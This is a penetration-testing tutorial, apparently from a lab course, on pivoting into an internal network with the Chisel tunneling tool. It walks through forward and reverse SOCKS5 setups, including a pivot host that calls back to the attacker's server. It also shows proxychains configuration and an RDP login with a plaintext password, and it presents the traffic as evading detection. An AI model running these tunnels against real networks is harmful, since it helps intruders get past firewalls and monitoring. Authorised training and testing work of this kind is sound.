# SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP tunneling tool written in Go that wraps traffic in HTTP and secures it with SSH underneath. The result is a tunnel that looks like ordinary web traffic to a firewall or network monitoring appliance, making it one of the more detection-resistant pivoting tools available. A single compiled binary handles both server and client roles, which simplifies deployment.

## Building and Transferring the Binary

Chisel requires Go to build from source. The compiled binary is self-contained -- no dependencies need to be deployed to the pivot host alongside it:

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

Binary size matters on engagements. A default Go build produces a noticeably large binary, and tools like `upx` can compress it significantly before transfer. Once built, copy it to the pivot host:

```bash
scp chisel ubuntu@10.129.202.64:~/
```

If glibc version mismatches cause errors on the pivot host, grab a prebuilt release from the [GitHub releases page](https://github.com/jpillora/chisel/releases) that matches the target OS and architecture instead of building locally.

## Forward Pivot (Server on the Pivot Host)

This is the standard setup where the pivot host is accessible from the attack host and can accept inbound connections. The server runs on the Ubuntu pivot host and the client runs on the attack host.

Start the server on the pivot host, enabling SOCKS5:

```bash
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

Connect from the attack host:

```bash
./chisel client -v 10.129.202.64:1234 socks
```

The client output confirms the SOCKS5 proxy is active on port 1080:

```
client: tun: proxy#127.0.0.1:1080=>socks: Listening
client: Connected (Latency 120.170822ms)
```

Update `/etc/proxychains.conf` to point to that local port:

```
[ProxyList]
socks5 127.0.0.1 1080
```

Any tool prefixed with proxychains now routes through the tunnel to the `172.16.5.0/23` network:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Reverse Pivot (Server on the Attack Host)

When firewall rules block inbound connections to the pivot host, the standard setup fails because the attack host cannot initiate the connection to start the tunnel. The reverse mode flips this -- the attack host runs the server and the pivot host connects outward to it, which most firewalls permit.

Start the server on the attack host with the `--reverse` flag:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

From the Ubuntu pivot host, connect back to the attack host using `R:socks` to specify a reverse SOCKS proxy:

```bash
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

The `R:` prefix tells the server to expose the SOCKS proxy on its own default port (1080) and terminate connections at the client's internal proxy. After the connection is established, the proxychains configuration and usage remain identical to the forward setup -- `socks5 127.0.0.1 1080` in proxychains.conf and the same proxychains commands on the attack host.

## Forward vs Reverse Mode

| Aspect | Forward Pivot | Reverse Pivot |
|---|---|---|
| Server location | Pivot host | Attack host |
| Who initiates the tunnel | Attack host connects to pivot | Pivot host connects to attack host |
| Firewall requirement | Pivot host must accept inbound | Pivot host only needs outbound access |
| SOCKS proxy location | Attack host port 1080 | Attack host port 1080 |
| Client flag | `socks` | `R:socks` |

Both modes end with the same outcome -- a SOCKS5 proxy on `127.0.0.1:1080` on the attack host routing traffic into the internal network. The only difference is which direction the initial HTTP/SSH connection is established, which determines which mode to use based on what the target environment's firewall permits.
